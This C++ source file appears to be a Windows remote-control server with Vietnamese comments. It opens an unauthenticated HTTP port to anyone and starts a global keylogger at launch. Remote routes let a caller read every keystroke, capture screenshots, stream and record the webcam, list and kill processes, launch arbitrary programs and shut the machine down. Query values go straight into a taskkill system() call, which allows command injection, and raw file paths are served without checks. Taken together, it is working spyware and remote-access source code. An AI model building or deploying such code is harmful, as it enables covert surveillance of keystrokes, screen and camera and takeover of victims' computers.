#include <opencv2/opencv.hpp>
#include <mutex>
#include <iostream>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <vector>
#include <string>
#include <map>
#include <sstream>
#include <algorithm>
#include <vfw.h>

#pragma comment(lib, "Ws2_32.lib")

//g++ all_in_one.cpp -o server.exe -lws2_32 -lgdi32 -lvfw32

// Cấu hình
const int PORT = 6969;
const int BUFFER_SIZE = 4096;

std::map<std::string, std::string> APPS = {
    {"notepad", "notepad.exe"},
    {"mspaint", "mspaint.exe"},
    {"cmd", "cmd.exe"},
    {"calc", "calc.exe"},
    {"chrome", "chrome.exe"}
};

// Hàm helper trả về HTTP Response có CORS header (quan trọng để JS gọi được)
std::string http_response(const std::string& body, const std::string& status = "200 OK", const std::string& content_type = "text/html") {
    std::string response = "HTTP/1.1 " + status + "\r\n";
    response += "Content-Type: " + content_type + "\r\n";
    response += "Access-Control-Allow-Origin: *\r\n"; // Cho phép mọi nguồn truy cập
    response += "Access-Control-Allow-Methods: GET, POST\r\n";
    response += "Content-Length: " + std::to_string(body.length()) + "\r\n";
    response += "Connection: close\r\n\r\n";
    response += body;
    return response;
}



////////////////


void serve_file(SOCKET client_socket, const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::string msg = http_response("File not found", "404 Not Found");
        send(client_socket, msg.c_str(), msg.length(), 0);
        return;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<char> buffer(size);
    if (file.read(buffer.data(), size)) {
        // Xác định loại file (MIME type)
        std::string content_type = "application/octet-stream";
        if (filepath.find(".bmp") != std::string::npos) content_type = "image/bmp";
        else if (filepath.find(".avi") != std::string::npos) content_type = "video/x-msvideo";

        // Tạo Header HTTP chuẩn
        std::string header = "HTTP/1.1 200 OK\r\n";
        header += "Content-Type: " + content_type + "\r\n";
        header += "Content-Length: " + std::to_string(size) + "\r\n";
        header += "Access-Control-Allow-Origin: *\r\n";
        header += "Connection: close\r\n\r\n";

        // Gửi Header trước
        send(client_socket, header.c_str(), header.length(), 0);
        
        // Gửi dữ liệu file (Binary)
        send(client_socket, buffer.data(), size, 0);
    }
    file.close();
}

// ====================== APPS ===================================
void start_app_sys(const std::string& exe_path) {
    ShellExecuteA(NULL, "open", exe_path.c_str(), NULL, NULL, SW_SHOWNORMAL);
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char windowTitle[256];

    // Chỉ lấy các cửa sổ đang hiển thị (Visible)
    if (IsWindowVisible(hwnd)) {
        // Lấy độ dài tiêu đề, bỏ qua cửa sổ không có tên
        int length = GetWindowTextLength(hwnd);
        if (length > 0) {
            // Lấy tiêu đề cửa sổ
            GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));

            // Kiểm tra loại trừ "Program Manager" (thường là Desktop background) nếu muốn
            if (std::string(windowTitle) != "Program Manager") {
                 // Ép kiểu lParam về stringstream để ghi dữ liệu
                std::stringstream* rows = reinterpret_cast<std::stringstream*>(lParam);
                
                // Format HTML theo yêu cầu
                *rows << "<li>" << windowTitle << "</li>";
            }
        }
    }
    return TRUE; // Tiếp tục duyệt cửa sổ tiếp theo
}

// 2. Hàm chính để gọi trong server của bạn
std::string list_apps() {
    std::stringstream rows;
    
    // Gọi EnumWindows, truyền địa chỉ của 'rows' vào tham số lParam
    EnumWindows(EnumWindowsProc, (LPARAM)&rows);
    
    return http_response(rows.str());
}

// ============== processess         =================================
std::string list_processes() {
    std::stringstream rows;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return http_response("Error snapshot", "500 Internal Server Error");

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            rows << "<li><span style='color:#f59e0b'>" << pe.th32ProcessID << "</span> - " << pe.szExeFile << "</li>";
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return http_response(rows.str());
}

void stop_process_sys(const std::string& process_name) {
    // Lệnh taskkill của Windows cho nhanh gọn
    std::string cmd = "taskkill /F /IM " + process_name;
    system(cmd.c_str());
}

// ==================== SYSTEM =========================
std::string system_control(const std::string& action) {
    if (action == "shutdown") {
        system("shutdown /s /t 60"); // Shutdown sau 60s
        return http_response("Shutting down in 60s...");
    } else if (action == "restart") {
        system("shutdown /r /t 60");
        return http_response("Restarting in 60s...");
    }
    return http_response("Unknown command", "400 Bad Request");
}

// ======================== KEYLOGGER ========================
HHOOK hHook = NULL;
std::string KEY_LOG_BUFFER = ""; // Bộ nhớ lưu phím

std::string keylog_append(const std::string& key) {
    if (key == "Enter") KEY_LOG_BUFFER += "\n";
    else if (key == "Space") KEY_LOG_BUFFER += " ";
    else if (key == "Backspace") { if (!KEY_LOG_BUFFER.empty()) KEY_LOG_BUFFER.pop_back(); }
    else KEY_LOG_BUFFER += key;
    
    std::cout << "Key received: " << key << std::endl;
    return http_response("OK");
}

void AddKeyToLog(int key_stroke) {
    if (key_stroke == 13) KEY_LOG_BUFFER += " [ENTER]\n";
    else if (key_stroke == 8) {
        if (!KEY_LOG_BUFFER.empty()) KEY_LOG_BUFFER.pop_back();
    }
    else if (key_stroke == 32) KEY_LOG_BUFFER += " ";
    else if (key_stroke == VK_TAB) KEY_LOG_BUFFER += " [TAB] ";
    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT) {} // Bỏ qua shift đơn lẻ
    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL) {}
    else if (key_stroke == VK_MENU || key_stroke == VK_LMENU || key_stroke == VK_RMENU) {}
    else if (key_stroke == VK_CAPITAL) KEY_LOG_BUFFER += " [CAPS] ";
    else {
        char key = (char)key_stroke;
        // Kiểm tra xem có phải ký tự in được không
        if (key >= 32 && key <= 126) {
            // Xử lý Shift (đơn giản hóa: nếu CapsLock hoặc Shift đang giữ thì viết hoa)
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000);
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001);
            
            if (!shift && !caps) {
                key = tolower(key);
            }
            KEY_LOG_BUFFER += key;
        }
    }
    std::cout << "Key logged: " << key_stroke << std::endl; // Debug
}

// Callback: Windows sẽ gọi hàm này mỗi khi có phím nhấn
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
            AddKeyToLog(pKey->vkCode);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Hàm chạy vòng lặp bắt phím (Chạy trên luồng riêng)
void StartKeyloggerThread() {
    // Cài đặt Hook loại WH_KEYBOARD_LL (Low Level)
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    
    if (hHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return;
    }

    // Vòng lặp tin nhắn (Bắt buộc để Hook hoạt động)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
}

std::map<std::string, std::string> parse_query(const std::string& path) {
    std::map<std::string, std::string> query;
    size_t q_pos = path.find('?');
    if (q_pos != std::string::npos) {
        std::string query_str = path.substr(q_pos + 1);
        std::stringstream ss(query_str);
        std::string segment;
        while (std::getline(ss, segment, '&')) {
            size_t eq_pos = segment.find('=');
            if (eq_pos != std::string::npos) {
                query[segment.substr(0, eq_pos)] = segment.substr(eq_pos + 1);
            }
        }
    }
    return query;
}

std::string get_route_path(const std::string& path) {
    size_t q_pos = path.find('?');
    if (q_pos != std::string::npos) return path.substr(0, q_pos);
    return path;
}

// ====================== LOGIC SCREENSHOT ======================
std::string take_screenshot() {
    int x1 = 0; int y1 = 0;
    int x2 = GetSystemMetrics(SM_CXSCREEN);
    int y2 = GetSystemMetrics(SM_CYSCREEN);
    int width = x2 - x1;
    int height = y2 - y1;

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);

    BITMAP bmpScreen;
    GetObject(hBitmap, sizeof(BITMAP), &bmpScreen);
    
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    
    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
    char *lpbitmap = (char *)GlobalLock(hDIB);
    GetDIBits(hScreen, hBitmap, 0, (UINT)bmpScreen.bmHeight, lpbitmap, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    std::string filename = "screenshot.bmp"; // Lưu đè vào file này
    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwSizeofDIB;
    bmfHeader.bfType = 0x4D42; // BM

    DWORD dwBytesWritten = 0;
    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);

    CloseHandle(hFile);
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    return filename;
}

// ====================== LOGIC WEBCAM  ======================
cv::Mat latest_frame;
std::mutex frame_mutex;
bool webcam_running = false;
std::thread webcam_thread;

// Webcam stream thread
void webcam_stream_thread() {
    cv::VideoCapture cap(0, cv::CAP_DSHOW);
    if (!cap.isOpened()) return;

    // Set độ phân giải 1080p
    cap.set(cv::CAP_PROP_FRAME_WIDTH, 1920);
    cap.set(cv::CAP_PROP_FRAME_HEIGHT, 1080);
    cap.set(cv::CAP_PROP_FPS, 30);

    webcam_running = true;
    cv::Mat frame;

    while (webcam_running) {
        cap >> frame;
        if (frame.empty()) continue;

        {
            std::lock_guard<std::mutex> lock(frame_mutex);
            latest_frame = frame.clone(); // Luôn giữ frame mới nhất
        }

        cv::waitKey(30);
    }

    cap.release();
    webcam_running = false;
}

void start_webcam() {
    if (!webcam_running) {
        webcam_thread = std::thread(webcam_stream_thread);
        webcam_thread.detach();
    }
}

void stop_webcam() {
    webcam_running = false;
}

// Get latest frame for MJPEG
bool get_latest_frame(std::vector<uchar>& buffer) {
    std::lock_guard<std::mutex> lock(frame_mutex);
    if (latest_frame.empty()) return false;
    cv::imencode(".jpg", latest_frame, buffer);
    return true;
}

// Record video to AVI
void record_webcam_thread_func(const std::string& filename, int duration_ms) {
    cv::VideoCapture cap(0, cv::CAP_DSHOW);
    if (!cap.isOpened()) return;

    // 1080p
    int width = 1920;
    int height = 1080;
    int fps = 15;

    cv::VideoWriter writer(filename, cv::VideoWriter::fourcc('M','J','P','G'), fps, cv::Size(width, height));
    if (!writer.isOpened()) return;

    int total_frames = fps * duration_ms / 1000;
    cv::Mat frame;

    for (int i = 0; i < total_frames; ++i) {
        cap >> frame;
        if (frame.empty()) continue;
        writer.write(frame);
        cv::waitKey(1000 / fps);
    }

    writer.release();
    cap.release();
}

int main() {
    
    std::thread loggerThread(StartKeyloggerThread);
    loggerThread.detach();


    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    bind(server_fd, (sockaddr*)&address, sizeof(address));
    listen(server_fd, 5);

    std::cout << "Server running on port " << PORT << "...\n";
    std::cout << "Keylogger is active in background...\n";

    while (true) {
        SOCKET client_socket = accept(server_fd, NULL, NULL);
        if (client_socket == INVALID_SOCKET) continue;

        char buffer[BUFFER_SIZE] = {0};
        recv(client_socket, buffer, BUFFER_SIZE, 0);
        
        std::string request(buffer);
        // Lấy dòng đầu tiên: GET /path HTTP/1.1
        std::stringstream ss(request);
        std::string method, full_path;
        ss >> method >> full_path;

        if (method.empty()) {
            closesocket(client_socket);
            continue;
        }

        std::string route = get_route_path(full_path);
        std::map<std::string, std::string> query = parse_query(full_path);
        std::string response;

        std::cout << "Request: " << route << std::endl;
        // --- ROUTER ---
        if (route == "/ping") {
            response = http_response("pong");
        }
        else if (route.find(".bmp") != std::string::npos || route.find(".avi") != std::string::npos) {
            std::string filename = route.substr(1); 
            serve_file(client_socket, filename);
            closesocket(client_socket);
            continue; // Xử lý xong thì tiếp tục vòng lặp mới
        }

        else if (route == "/apps") {
            response = list_apps();
        }
        else if (route == "/apps/start") {
            std::string name = query["name"];
            if (APPS.count(name)) start_app_sys(APPS[name]);
            else start_app_sys(name); // Thử mở trực tiếp nếu không có trong dict
            response = http_response("Started " + name);
        }
        else if (route == "/apps/stop") {
            // Logic dừng app theo tên định nghĩa trong APPS
            std::string name = query["name"];
            if (APPS.count(name)) stop_process_sys(APPS[name]);
            else stop_process_sys(name + ".exe");
            response = http_response("Stopped " + name);
        }
        else if (route == "/processes") {
            response = list_processes();
        }
        else if (route == "/processes/stop") {
            // Nhận PID hoặc tên
            std::string target = query["name"]; // Dùng param 'name' cho thống nhất
            stop_process_sys(target); 
            response = http_response("Kill command sent to " + target);
        }
        else if (route == "/keylogger/send") {
            response = keylog_append(query["key"]);
        }
        else if (route == "/keylogger/get") {
            response = http_response(KEY_LOG_BUFFER);
        }
        else if (route == "/shutdown") {
            response = system_control("shutdown");
        }
        else if (route == "/restart") {
            response = system_control("restart");
        }
        else if (route == "/screenshot") {
            std::string filename = take_screenshot(); 
            response = http_response("/" + filename); 
        }

        else if (route == "/webcam/start") {
            start_webcam();
            response = http_response("Webcam started");
        }
        else if (route == "/webcam/stop") {
            stop_webcam();
            response = http_response("Webcam stopped");
        }
        else if (route.find("/snapshot_stream") != std::string::npos) {
            std::vector<uchar> jpeg_buf;
            if (get_latest_frame(jpeg_buf)) {
                std::string header = "HTTP/1.1 200 OK\r\n";
                header += "Content-Type: image/jpeg\r\n";
                header += "Content-Length: " + std::to_string(jpeg_buf.size()) + "\r\n";
                header += "Connection: close\r\n\r\n";

                send(client_socket, header.c_str(), header.size(), 0);
                send(client_socket, reinterpret_cast<char*>(jpeg_buf.data()), jpeg_buf.size(), 0);
            } else {
                std::string err = "HTTP/1.1 404 Not Found\r\n\r\n";
                send(client_socket, err.c_str(), err.size(), 0);
            }
        }
        else if (route == "/webcam") {
            int duration = 10;
            if (query.count("seconds")) {
                try { duration = std::stoi(query["seconds"]); } catch(...) {}
            }
            std::string filename = "webcam_" + std::to_string(duration) + "s.avi";
            std::thread t(record_webcam_thread_func, filename, duration * 1000);
            t.detach();

            response = http_response("/" + filename); // trả về đường dẫn file
        }
        else if (route.find(".avi") != std::string::npos) {
            std::string filename = route.substr(1);
            std::ifstream file(filename, std::ios::binary | std::ios::ate);
            if (file.is_open()) {
                std::streamsize size = file.tellg();
                file.seekg(0, std::ios::beg);
                std::vector<char> buffer(size);
                if (file.read(buffer.data(), size)) {
                    std::string header = "HTTP/1.1 200 OK\r\n";
                    header += "Content-Type: video/x-msvideo\r\n";
                    header += "Content-Disposition: attachment; filename=\"" + filename + "\"\r\n";
                    header += "Content-Length: " + std::to_string(size) + "\r\n";
                    header += "Connection: close\r\n\r\n";

                    send(client_socket, header.c_str(), header.size(), 0);
                    send(client_socket, buffer.data(), buffer.size(), 0);
                }
                file.close();
            } else {
                std::string notFound = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n";
                send(client_socket, notFound.c_str(), notFound.size(), 0);
            }
        }
        else {
            response = http_response("Not Found", "404 Not Found");
        }

        send(client_socket, response.c_str(), response.length(), 0);
        closesocket(client_socket);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}